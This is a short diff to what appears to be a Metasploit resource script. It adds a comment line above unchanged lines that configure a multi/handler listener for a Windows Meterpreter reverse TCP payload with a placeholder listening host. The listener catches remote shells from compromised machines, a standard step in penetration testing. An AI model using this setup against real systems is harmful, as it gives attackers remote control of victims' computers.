@@ -1,3 +1,4 @@
+# Metasploit resource script for handling multiple payloads
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set lhost %lhost%
